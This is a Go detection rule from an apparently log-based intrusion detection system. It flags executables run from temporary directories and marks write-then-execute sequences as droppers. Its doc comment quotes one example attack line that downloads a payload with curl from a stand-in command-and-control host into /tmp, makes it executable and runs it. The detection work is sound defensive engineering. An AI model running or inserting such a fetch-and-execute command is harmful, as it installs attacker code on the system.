package rule

import (
	"fmt"
	"strings"
	"time"

	"github.com/Kes0x6f/Log-Based--IDS/internal/detection"
	"github.com/Kes0x6f/Log-Based--IDS/internal/detection/context"
	"github.com/Kes0x6f/Log-Based--IDS/internal/model"
)

// AuditExecTmpRule detects execution of binaries from world-writable
// temporary directories (/tmp, /dev/shm, /run/shm, /var/tmp).
//
// Severity tiers:
//   - EXEC_TMP with no preceding write   → HIGH   (executing from /tmp is unusual)
//   - EXEC_TMP after a TMP_WRITE hit     → CRITICAL (write-then-execute = dropper/stager)
//
// The cross-event correlation window is 10 minutes: if a file is written to
// /tmp and then executed within 10 minutes, it is classified as a dropper.
// This catches the classic attack chain:
//
//	curl http://c2.evil/payload.sh -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x
//
// Required auditd rules:
//
//	# Execution from temp dirs
//	-a always,exit -F arch=b64 -S execve -F dir=/tmp     -k exec_tmp
//	-a always,exit -F arch=b64 -S execve -F dir=/dev/shm -k exec_tmp
//	-a always,exit -F arch=b64 -S execve -F dir=/var/tmp -k exec_tmp
//
//	# Writes to temp dirs (for write→exec correlation)
//	-a always,exit -F arch=b64 -S open,openat,openat2 -F dir=/tmp     -F perm=w -k tmp_write
//	-a always,exit -F arch=b64 -S open,openat,openat2 -F dir=/dev/shm -F perm=w -k tmp_write
//	-a always,exit -F arch=b64 -S open,openat,openat2 -F dir=/var/tmp -F perm=w -k tmp_write
type AuditExecTmpRule struct {
	WriteWindow time.Duration // how long to remember a tmp write before expiry
	Cooldown    time.Duration // gap between alerts for the same path
}

func NewAuditExecTmpRule() *AuditExecTmpRule {
	return &AuditExecTmpRule{
		WriteWindow: 10 * time.Minute,
		Cooldown:    15 * time.Minute,
	}
}

func (r *AuditExecTmpRule) Meta() detection.RuleMeta {
	return detection.RuleMeta{
		LogSource:  "audit",
		Program:    "auditd",
		EventTypes: []string{"TMP_WRITE", "EXEC_TMP"},
	}
}

// ── Private state ──────────────────────────────────────────────────────────

type auditExecTmpState struct {
	// recentWrites tracks (filepath → write timestamp) for files written
	// into /tmp and family.  Pruned lazily on each EXEC_TMP event.
	recentWrites map[string]time.Time

	// per-path alert deduplication
	lastAlertByPath map[string]time.Time
	lastAlertID     map[string]string
}

func newAuditExecTmpState() *auditExecTmpState {
	return &auditExecTmpState{
		recentWrites:    make(map[string]time.Time),
		lastAlertByPath: make(map[string]time.Time),
		lastAlertID:     make(map[string]string),
	}
}

func getAuditExecTmpState(ctx *context.DetectionContext) *auditExecTmpState {
	if v, ok := ctx.GetPrivate("audit_exec_tmp"); ok {
		return v.(*auditExecTmpState)
	}
	s := newAuditExecTmpState()
	ctx.SetPrivate("audit_exec_tmp", s)
	return s
}

// isTmpPath returns true for paths inside world-writable temporary directories.
func isTmpPath(p string) bool {
	for _, prefix := range []string{"/tmp/", "/dev/shm/", "/run/shm/", "/var/tmp/"} {
		if strings.HasPrefix(p, prefix) {
			return true
		}
	}
	return false
}

// ── Evaluate ───────────────────────────────────────────────────────────────

func (r *AuditExecTmpRule) Evaluate(event *model.NormalizedEvent, ctx *context.DetectionContext) []*model.Alert {
	s := getAuditExecTmpState(ctx)
	path := event.Command
	now := event.Timestamp

	if path == "" {
		return nil
	}

	switch event.EventType {

	// ── Record the write for later correlation ─────────────────────────────
	case "TMP_WRITE":
		if isTmpPath(path) {
			s.recentWrites[path] = now
		}
		return nil

	// ── Execution from temp dir ────────────────────────────────────────────
	case "EXEC_TMP":
		// Prune stale write records before checking
		for p, t := range s.recentWrites {
			if now.Sub(t) > r.WriteWindow {
				delete(s.recentWrites, p)
			}
		}

		last := s.lastAlertByPath[path]
		inCooldown := !last.IsZero() && now.Sub(last) <= r.Cooldown

		if inCooldown {
			if id := s.lastAlertID[path]; id != "" {
				return []*model.Alert{{
					IsUpdate:        true,
					OriginalAlertID: id,
					EventCount:      1,
				}}
			}
			return nil
		}

		// Was this file written recently?
		writeTime, wasDropped := s.recentWrites[path]
		var (
			severity model.Severity
			msg      string
		)

		if wasDropped {
			lag := now.Sub(writeTime).Round(time.Second)
			severity = model.SeverityCritical
			msg = fmt.Sprintf(
				"Dropper detected: %s written to temp dir then executed %v later (user: %s)",
				path, lag, event.Username,
			)
		} else {
			severity = model.SeverityHigh
			msg = fmt.Sprintf(
				"Execution from temp directory: %s (user: %s) — possible in-memory stager",
				path, event.Username,
			)
		}

		alert := model.NewAlert(
			"Execution from Temp Directory",
			severity,
			"execution",
			msg,
			event,
			1,
		)

		s.lastAlertByPath[path] = now
		s.lastAlertID[path] = alert.ID

		// Remove the write record — we've correlated it
		delete(s.recentWrites, path)

		return []*model.Alert{alert}
	}

	return nil
}
